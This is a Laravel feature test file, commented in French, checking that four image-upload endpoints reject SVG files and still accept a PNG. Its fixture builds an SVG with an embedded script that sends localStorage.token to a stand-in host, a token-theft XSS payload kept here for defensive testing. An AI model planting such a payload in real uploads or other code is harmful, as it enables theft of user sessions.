<?php

namespace Tests\Feature\Api;

use App\Models\Product;
use App\Models\User;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\Concerns\RefreshTenantDatabase;
use Tests\TestCase;

/**
 * Le SVG est refusé partout où l'application accepte une image.
 *
 * Un SVG est du XML, pas un format matriciel : il peut porter un <script> qui
 * s'exécute dans l'origine du tenant. Le jeton Sanctum vivant dans
 * localStorage, un logo piégé suffit à voler la session.
 *
 * Le piège à connaître : la règle `image` de Laravel 10 accepte le SVG
 * (ValidatesAttributes::validateImage liste 'svg'). Écrire `['image']` seul ne
 * ferme donc rien — il faut épeler `mimes:` à chaque endroit. C'est ce que ces
 * tests vérifient, sur les quatre points d'entrée réels.
 */
class SvgUploadRejectedTest extends TestCase
{
    use RefreshTenantDatabase;

    private User $admin;

    protected function setUp(): void
    {
        parent::setUp();
        Storage::fake('public');
        $this->admin = User::factory()->admin()->create();
    }

    /** Un SVG minimal mais porteur de script — exactement le cas redouté. */
    private function maliciousSvg(string $name = 'logo.svg'): UploadedFile
    {
        return UploadedFile::fake()->createWithContent(
            $name,
            '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//x/"+localStorage.token)</script></svg>',
        );
    }

    public function test_the_company_logo_refuses_svg(): void
    {
        $this->actingAs($this->admin, 'sanctum')
            ->postJson('/api/settings/logo', ['logo' => $this->maliciousSvg()])
            ->assertUnprocessable()
            ->assertJsonValidationErrors('logo');

        $this->assertEmpty(Storage::disk('public')->files('logos'));
    }

    public function test_product_images_refuse_svg(): void
    {
        $product = Product::factory()->create();

        $this->actingAs($this->admin, 'sanctum')
            ->postJson("/api/products/{$product->id}/images", [
                'image' => $this->maliciousSvg('produit.svg'),
            ])
            ->assertUnprocessable();

        $this->assertEmpty(Storage::disk('public')->files('products'));
    }

    public function test_the_media_gallery_refuses_svg(): void
    {
        $this->actingAs($this->admin, 'sanctum')
            ->postJson('/api/storage/products/upload', [
                'images' => [$this->maliciousSvg('galerie.svg')],
            ])
            ->assertUnprocessable()
            ->assertJsonValidationErrors('images.0');

        $this->assertEmpty(Storage::disk('public')->files('products'));
    }

    public function test_slides_refuse_svg(): void
    {
        $this->actingAs($this->admin, 'sanctum')
            ->postJson('/api/slides', [
                'title'     => 'Bannière',
                'image'     => $this->maliciousSvg('slide.svg'),
                'link_type' => 'none',
                'position'  => 'hero',
            ])
            ->assertUnprocessable();

        $this->assertEmpty(Storage::disk('public')->files('slides'));
    }

    public function test_a_real_png_is_still_accepted(): void
    {
        // Le garde-fou ne doit pas fermer la porte aux formats légitimes.
        $this->actingAs($this->admin, 'sanctum')
            ->postJson('/api/settings/logo', [
                'logo' => UploadedFile::fake()->image('logo.png', 200, 200),
            ])
            ->assertOk();

        $this->assertNotEmpty(Storage::disk('public')->files('logos'));
    }
}
